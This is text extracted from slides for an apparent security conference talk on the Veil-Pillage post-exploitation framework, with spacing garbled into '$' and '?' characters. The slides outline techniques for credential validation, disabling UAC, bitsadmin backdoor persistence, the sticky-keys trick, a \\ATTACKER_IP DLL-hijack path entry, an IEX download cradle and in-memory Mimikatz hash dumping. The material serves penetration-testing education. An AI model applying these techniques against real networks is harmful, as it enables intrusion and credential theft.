Veil$Catapult$
• exe_delivery$
• python_injector$
• powershell_injector$
New$Features$
• Powershell$Stagers$
• Logging/cleanup$
• MSF$DB$Integration$
• Modular$structure$
• External$integration$
Veil%Pillage*
New$Modules$
enumeration/**
▪  host/credential_validation$
– checks$what$creds$work$on$what$systems$
▪  domain/user_hunter$
– ﬁnds$where$Windows$domain$users$are$
logged$in$on$the$network$
▪  host/enum_host$
– performs$several$standard$enumeration$
actions$
management/**
▪  check_uac/disable_uac/enable_uac$
– full$user$account$control$management$
▪  enable_rdp/disable_rdp$
– enables$RDP$and$the$necessary$ﬁrewall$rules$
▪  force_[logoﬀ/reboot/shutdown]$
– needed$to$trigger$some$particular$post?
exploitation$eﬀects$
persistence/**
▪  bitsadmin$
– adds$a$nice$background$job$to$download/
execute$an$.exe$backdoor$
▪  registry/sticky_keys*$
– Sets$the$stickkeys$cmd.exe$trick,$or$uploads$
an$executable$for$to$trigger$
▪  registry/unc_dll$
– appends$\\ATTACKER_IP;$to$%PATH%,$
allowing$you$to$monitor$for$.dll$hijacking$
opportunies$
powersploit/**
▪  Several$PowerSploit$modules$are$
included$in$Pillage$
▪  A$web$server$is$stood$up$in$the$
background$
– the$‘IEX$(New?Object$
Net.WebClient).DownloadString(...)’$cradle$is$
transparently$triggered$
▪  Makes$it$easy$to$run$PowerSploit$across$
multiple$machines$
Veil?$
Pillage$
Veil$Catapult$
• exe_delivery$
• python_injector$
• powershell_injector$
New$Features$
• Powershell$Stagers$
• Logging/cleanup$
• MSF$DB$Integration$
• Modular$structure$
• External$integration$
New$Modules$
• PowerSploit$integration$
• enumeration/*$
• persistence/*$
• management/*$
Primitives$
• pth?wmis$
• pth?winexe$
• Impacket?smbexec$
• Impacket$
Hashes*and*
Plaintexts*
Getting$the$Goods$
Hashdumping*
▪  There$are$a$diverse$number$of$ways$to$
dump$hashes$on$a$system$
▪  Traditional:''
–  gsecdump,$credump,$etc.$
–  Registry$backups$w/$reg.exe$
–  Meterpreter$(hashdump/wdigest)$
▪  New'Hotness:'
–  Powerdump.ps1$
–  WCE/Mimikatz$binaries$
–  PowerSploit/Exﬁltration/Invoke?Mimikatz.ps1$
Hashdumping*
▪  Diﬀerent$approaches$work$in$diﬀerent$
situations$
▪  Dependent$on$architecture,$Powershell$
installation,$AV?installation,$etc.$
▪  Some$involve$dropping$well?known,$
close?sourced$tools$to$disk$
In%Memory*Mimikatz*
+ 
= <3  
In%Memory*Mimikatz*
▪  PowerSploit/Exﬁltration/Invoke?
Mimikatz.ps1$
▪  Utilizes$$Joe$"clymb3r"$Bialek’s$prior$
work$in$Invoke?ReﬂectivePEInjection$to$
inject$an$architecture?appropriate$
Mimikatz$.dll$
▪  Harnesses$the$power$of$Mimikatz$
without$touching$disk$
*
Pillage*Style*
▪  Let’s$aggregate$some$of$the$best$
techniques$and$build$some$logic$in$
$$$$$if$(powershell_installed)$ $
${$Powerdump/PowerSploit}$
$$$$$else${$$
$determine_arch${$
$
$host/execute$appropriate$binaries$}}$
▪  Expose$these$techniques$to$the$user$for$
situation?dependent$decisions$
Veil?$
Pillage$
Veil$Catapult$
• exe_delivery$
• python_injector$
• powershell_injector$
New$Features$
• Powershell$Stagers$
• Logging/cleanup$
• MSF$DB$Integration$
• Modular$structure$
• External$integration$
New$Modules$
• PowerSploit$integration$
• enumeration/*$
• persistence/*$
• management/*$
Primitives$
• pth?wmis$
• pth?winexe$
• Impacket?smbexec$
• Impacket$
Hashdumping$
• PowerShell$detection$
• In$memory$hashdump/
Mimikatz$
• Host/execute$binaries$
Demos*
KB*2871997*
OMG$US$PENTESTERS$ARE$OUT$OF$A$JOB!!$
KB*2871997*
▪  The$“pass?the?hash”$killing$patch,$aka$
the$“Mimikatz$KB”$:)$
▪  Microsoft$backport$of$Windows$8.1$
protections$that$prevents$
“...network$logon$and$remote$interactive$
logon$to$domain?joined$machine$using$
local$accounts”$
▪  Sounds$ominous...$
PTH%killer?*lol*:)*
KB*2871997*tl;dr**
▪  The$rid?500$Administrator$account$(if$it’s$
enabled)$and$domain$accounts$in$the$
Administrators$localgroup$can$still$PTH$
– This$account$is$often$still$enabled$in$many$
enterprise$environments$
▪  Powershell$Remoting$still$works$ﬁne$
▪  Windows$XP/2003$obviously$unaﬀected$
▪  Raises$the$bar,$but$PTH$isn’t$going$away$
anytime$soon$
Local*Admin*Enumeration*
▪  With$a$local/unprivileged$domain$account,$
you$can$use$PowerShell$(or$Nmap)$to:$
– ﬁnd$what$the$local$rid?500$is$renamed$to$and$
whether$it’s$enabled$
– enumerate$what$domain$accounts$have$local$
admin$privileges$on$a$machine$
▪  Powershell$functions$have$been$integrated$
into$Veil?Powerview$
▪  More$information:$http://harmj0y.net*
Local*Admin*Enumeration*
Module*Releases*
▪  Just$like$Veil?Evasion,$lots$of$module$
ideas$
– more$if$people$want$to$contribute$:)$
▪  Planned$releases$on$the$1st$of$the$month$
▪  Check$
http://www.veil?framework.com$for$
updates$
Module*Development*
▪  Implement$whatever$post?exploitation$
fun$you$can$think$of$
▪  Triggering$methods,$ﬁle$downloads,$etc.$
are$all$available$as$library$methods$
▪  Template$included$in$the$tree$and$blog$
post$up$soon$on$developing$your$own$
modules$
Recap*
▪  A$ﬂexible$framework$for$post?
exploitation$of$remote$machines$
▪  Three$separate$ways$of$triggering$
▪  New$modules$are$easy$to$implement$
with$the$common$library$
▪  Automation,$full$logging$capabilities,$
cleanup$scripts,$big$UI$focus,$active$
development$
Questions?*
▪  Contact'me:'
– @harmj0y*
– harmj0y@veil?framework.com$
– harmj0y$in$#veil$on$Freenode$
▪  Read'more:'
– https://www.veil?framework.com$
▪  Get'the'VeilGFramework:'
– https://github.com/Veil?Framework/$